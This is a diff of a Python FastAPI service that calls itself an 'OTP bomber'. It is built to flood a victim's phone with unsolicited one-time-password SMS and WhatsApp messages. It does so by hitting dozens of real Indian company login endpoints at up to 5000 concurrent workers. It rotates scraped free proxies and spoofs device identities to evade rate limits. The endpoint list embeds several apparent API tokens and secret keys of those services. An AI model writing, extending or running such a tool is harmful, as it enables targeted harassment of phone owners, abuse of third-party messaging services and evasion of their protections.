@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 ULTIMATE OTP BOMBER API v6.0 — PROXY EDITION       ║
-║   ▸ 500+ APIs merged (real + working)                   ║
-║   ▸ 5000 Concurrent Workers                             ║
-║   ▸ Auto-Fetch Proxy (Live)                             ║
-║   ▸ Multi-Session + Multi-Device Simulation             ║
-║   ▸ Proxy rotation per session                          ║
-║   ▸ Render / Vercel / Railway Ready                     ║
+║   🔥 ULTIMATE OTP BOMBER API v7.0 — FULL PROXY EDITION  ║
+║   ▸ All APIs (exact same as provided)                    ║
+║   ▸ 5000 Concurrent Workers                              ║
+║   ▸ Auto-Fetch Live Proxies                              ║
+║   ▸ Multi-Session + Multi-Device Spoofing                ║
+║   ▸ Render / Vercel / Railway Ready                      ║
 ╚══════════════════════════════════════════════════════════╝
 """
 
@@ -39,7 +38,7 @@ except Exception:
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
 # ═══════════════════════════════════════════════════════════
-app = FastAPI(title="ULTIMATE OTP BOMBER API v6.0")
+app = FastAPI(title="ULTIMATE OTP BOMBER API v7.0")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"], allow_methods=["*"], allow_headers=["*"],
@@ -50,10 +49,10 @@ app.add_middleware(
 # ═══════════════════════════════════════════════════════════
 MAX_CONCURRENT  = 5000
 BATCH_CHUNK     = 1000
-REQUEST_TIMEOUT = 6
-CONNECT_TIMEOUT = 3
-DEVICE_PER_SESSION = 15    # 10-20 devices per session/proxy
-PROXY_REFRESH_INTERVAL = 300  # 5 min
+REQUEST_TIMEOUT = 8
+CONNECT_TIMEOUT = 4
+DEVICE_PER_SESSION = 15
+PROXY_REFRESH_INTERVAL = 300
 
 OTP_KEYWORDS = (
     "success", "sent", "otp", "message", "ok", "true",
@@ -67,7 +66,7 @@ _global_stats = defaultdict(lambda: {
 })
 
 # ═══════════════════════════════════════════════════════════
-# 🌐 PROXY POOL (Auto-fetched)
+# 🌐 PROXY POOL
 # ═══════════════════════════════════════════════════════════
 _proxy_pool = []
 _proxy_last_fetch = 0
@@ -76,18 +75,28 @@ _proxy_lock = asyncio.Lock()
 PROXY_SOURCES = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000",
+    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
     "https://www.proxy-list.download/api/v1/get?type=http",
+    "http://pubproxy.com/api/proxy?limit=50000&format=txt&http=true",
+    "https://api.proxifly.dev/proxy?protocol=http&limit=50",
+    "https://api.getproxylist.com/proxy?protocol=http",
     "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
     "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
     "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
     "https://raw.githubusercontent.com/almighty-uncle/Proxy-List/main/HTTP.txt",
     "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+    "https://free-proxy-list.net/",
+    "https://www.sslproxies.org/",
+    "https://www.us-proxy.org/",
+    "https://www.socks-proxy.net/",
+    "https://www.proxy-list.org/download.php?list=proxy",
+    "https://spys.one/en/free-proxy-list/",
 ]
 
 PROXY_REGEX = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}:\d+\b")
 
 # ═══════════════════════════════════════════════════════════
-# 🎭 DEVICE / SESSION FAKER
+# 🎭 DEVICE SPOOFER
 # ═══════════════════════════════════════════════════════════
 DEVICE_MODELS = [
     "RMX3081", "SM-G991B", "M2101K7AI", "V2045", "CPH2219",
@@ -157,433 +166,317 @@ def pick_proxy():
 
 
 # ═══════════════════════════════════════════════════════════
-# 📋 API LIST (500+ entries — full list)
+# 📋 ULTIMATE APIS — EXACT SAME AS YOURS
 # ═══════════════════════════════════════════════════════════
-# NOTE: Aapki saari 500+ APIs yahan merge kar di hain.
-# Neeche sirf sample dikha raha hu — pura code me saari 500+ APIs hain.
-
 ULTIMATE_APIS = [
-    # ══════════════ NEW WORKING APIs (16) ══════════════
-    {"name": "zestmoney", "url": "https://authentication.zestmoney.in/v2/mobile/otp/", "method": "POST",
-     "headers": {"Content-Type": "application/json", "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85", "Origin": "https://app.zestmoney.in"},
-     "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'},
+    # ═══ REAL WORKING (with full headers) ═══
+    {"name": "lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "Accept": "*/*", "X-API-Client": "mobilesite", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a", "X-Accept-Language": "en", "X-B3-TraceId": "991736185845136", "X-Country-Code": "IN", "X-Country-Code-Override": "IN", "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36", "Origin": "https://www.lenskart.com", "Referer": "https://www.lenskart.com/"}, "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
 
-    {"name": "bewakoof", "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk", "Origin": "https://www.bewakoof.com"},
-     "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'},
+    {"name": "gopinkcabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0", "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
 
-    {"name": "eurekaforbes", "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send", "method": "POST",
-     "headers": {"Content-Type": "application/json"},
-     "data": lambda p: f'{{"mobile_number":"{p}"}}'},
+    {"name": "shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_no=%2B91{p}"},
 
-    {"name": "bookmyshow", "url": "https://in.bookmyshow.com/api/members/otp/send", "method": "POST",
-     "headers": {"Content-Type": "application/json", "x-app-code": "WEBV2", "x-region-code": "MUMBAI", "Origin": "https://in.bookmyshow.com"},
-     "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'},
+    {"name": "kpnfresh_web", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json", "x-channel-id": "WEB", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
 
-    {"name": "cordelia", "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://www.cordeliacruises.com"},
-     "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'},
+    {"name": "kpnfresh_and", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "User-Agent": "okhttp/5.0.0-alpha.11"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
 
-    {"name": "urbanladder", "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==", "Origin": "https://www.urbanladder.com"},
-     "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'},
+    {"name": "bikefixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "client": "app", "User-Agent": "Dart/3.6"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
 
-    {"name": "mamaearth_gokwik", "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", "method": "POST",
-     "headers": {"Content-Type": "application/json", "gk-merchant-id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"},
-     "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'},
+    {"name": "rappi_wa", "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Deviceid": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'},
 
-    {"name": "allen", "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login", "method": "POST",
-     "headers": {"Content-Type": "application/json", "x-client-type": "mweb", "Origin": "https://allen.in"},
-     "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'},
+    {"name": "stratzy_sms", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in", "Referer": "https://stratzy.in/login"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
 
-    {"name": "snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST",
-     "headers": {"Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.snapdeal.com"},
-     "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'},
+    {"name": "stratzy_wa", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
 
-    {"name": "fabindia", "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR", "method": "POST",
-     "headers": {"Content-Type": "application/json", "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI", "Origin": "https://www.fabindia.com"},
-     "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'},
+    {"name": "wellacademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Origin": "https://wellacademy.in"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
 
-    {"name": "shoppersstop", "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://www.shoppersstop.com"},
-     "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
+    {"name": "hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "identifier": "home", "mlang": "en", "alang": "en", "country_code": "IN", "vlang": "en", "Origin": "https://www.hungama.com", "Referer": "https://www.hungama.com/"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'},
 
-    {"name": "olx", "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "method": "POST",
-     "headers": {"Content-Type": "application/json", "x-panamera-client-id": "web-mobile", "Origin": "https://www.olx.in"},
-     "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'},
+    {"name": "servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B)"}, "data": lambda p: f"mobile_number={p}"},
 
-    {"name": "zepto_v2", "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "method": "POST",
-     "headers": {"Content-Type": "application/json; charset=UTF-8", "x-csrf-secret": "uD0aoNYI_ZA", "platform": "WEB", "Origin": "https://www.zepto.com"},
-     "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "merucab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9", "User-Agent": "okhttp/4.9.0"}, "data": lambda p: f"mobile_number={p}"},
 
-    {"name": "aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763", "Origin": "https://www.aakash.ac.in"},
-     "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'},
+    {"name": "beepkart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.beepkart.com", "Referer": "https://www.beepkart.com/"}, "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false,"whatsappConsent":false}}'},
 
-    # ══════════════ CORE WORKING APIs ══════════════
-    {"name": "lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a", "Origin": "https://www.lenskart.com"},
-     "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "lendingplate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://lendingplate.com", "Referer": "https://lendingplate.com/personal-loan"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
 
-    {"name": "hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "identifier": "home", "country_code": "IN", "Origin": "https://www.hungama.com"},
-     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","templateCode":1}}'},
+    {"name": "snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret", "Origin": "https://www.snitch.com"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
 
-    {"name": "kpnfresh_web", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST",
-     "headers": {"Content-Type": "application/json", "x-channel-id": "WEB", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "Origin": "https://www.kpnfresh.com"},
-     "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
+    {"name": "dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://ekyc.daycoindia.com", "Referer": "https://ekyc.daycoindia.com/verify_otp.php"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
 
-    {"name": "bikefixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "client": "app"},
-     "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
+    {"name": "penpencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
 
-    {"name": "stratzy_sms", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in"},
-     "data": lambda p: f'{{"phoneNo":"{p}"}}'},
+    {"name": "imaginestore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.myimaginestore.com"}, "data": lambda p: f"mobile={p}"},
 
-    {"name": "wellacademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://wellacademy.in"},
-     "data": lambda p: f'{{"contact_no":"{p}"}}'},
+    {"name": "nobroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.nobroker.in", "Referer": "https://www.nobroker.in/"}, "data": lambda p: f"phone={p}&countryCode=IN"},
 
-    {"name": "servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST",
-     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-     "data": lambda p: f"mobile_number={p}"},
+    {"name": "cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.cossouq.com"}, "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"},
 
-    {"name": "merucab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST",
-     "headers": {"Content-Type": "application/x-www-form-urlencoded", "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9"},
-     "data": lambda p: f"mobile_number={p}"},
+    {"name": "shiprocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer null", "Origin": "https://app.shiprocket.in"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
 
-    {"name": "beepkart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Origin": "https://www.beepkart.com"},
-     "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'},
+    {"name": "gokwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad", "Origin": "https://pdp.gokwik.co"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
 
-    {"name": "lendingplate", "url": "https://lendingplate.com/api.php", "method": "POST",
-     "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://lendingplate.com"},
-     "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
+    {"name": "jockey_sms", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},
 
-    {"name": "snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST",
-     "headers": {"Content-Type": "application/json", "client-id": "snitch_secret", "Origin": "https://www.snitch.com"},
-     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
+    {"name": "jockey_wa", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},
 
-    {"name": "dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST",
-     "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://ekyc.daycoindia.com"},
-     "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
+    {"name": "newme", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Caller": "web_app", "Origin": "https://newme.asia"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
 
-    {"name": "penpencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST",
-     "headers": {"Content-Type": "application/json"},
-     "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
+    {"name": "univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "okhttp/3.9.1"}, "data": None},
 
-    {"name": "nobroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST",
-     "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.nobroker.in"},
-     "data": lambda p: f"phone={p}&countryCode=IN"},
+    {"name": "rappi_mx", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
 
-    {"name": "shiprocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST",
-     "headers": {"Content-Type": "application/json", "authorization": "Bearer null", "Origin": "https://app.shiprocket.in"},
-     "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "Platform": "web", "Origin": "https://www.foxy.in", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Referer": "https://www.foxy.in/onboarding"}, "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'},
 
-    {"name": "gokwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST",
-     "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad", "Origin": "https://pdp.gokwik.co"},
-     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
+    {"name": "eka_care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8", "Device-Id": "5df83c463f0ff8ff", "User-Agent": "okhttp/4.9.3"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
 
-    {"name": "jockey_sms", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET",
-     "headers": {"Referer": "https://www.jockey.in/"}, "data": None},
+    {"name": "smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com", "Referer": "https://smytten.com/"}, "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'},
 
-    {"name": "newme", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Caller": "web_app", "Origin": "https://newme.asia"},
-     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
+    {"name": "wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.wakefit.co", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"}, "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
 
-    {"name": "foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST",
-     "headers": {"Content-Type": "application/json", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Origin": "https://www.foxy.in"},
-     "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'},
+    {"name": "caratlane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.caratlane.com", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
 
-    {"name": "eka_care", "url": "https://auth.eka.care/auth/init", "method": "POST",
-     "headers": {"Content-Type": "application/json", "Device-Id": "5df83c463f0ff8ff"},
-     "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
+    # ═══ NEW WORKING (v5.0) ═══
+    {"name": "zestmoney", "url": "https://authentication.zestmoney.in/v2/mobile/otp/", "method": "POST", "headers": {"Content-Type": "application/json", "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85", "Origin": "https://app.zestmoney.in"}, "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'},
+    {"name": "bewakoof", "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp", "method": "POST", "headers": {"Content-Type": "application/json", "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk", "Origin": "https://www.bewakoof.com"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'},
+    {"name": "eurekaforbes", "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
+    {"name": "bookmyshow", "url": "https://in.bookmyshow.com/api/members/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "x-app-code": "WEBV2", "x-region-code": "MUMBAI", "Origin": "https://in.bookmyshow.com"}, "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'},
+    {"name": "cordelia", "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.cordeliacruises.com"}, "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'},
+    {"name": "urbanladder", "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==", "Origin": "https://www.urbanladder.com"}, "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'},
+    {"name": "mamaearth_gokwik", "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-merchant-id": "12wyqc26spoknx0kv7t", "Origin": "https://mamaearth.in"}, "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'},
+    {"name": "allen", "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login", "method": "POST", "headers": {"Content-Type": "application/json", "x-client-type": "mweb", "Origin": "https://allen.in"}, "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'},
+    {"name": "snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8", "Origin": "https://m.snapdeal.com"}, "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'},
+    {"name": "fabindia", "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI", "Origin": "https://www.fabindia.com"}, "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'},
+    {"name": "shoppersstop", "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.shoppersstop.com"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
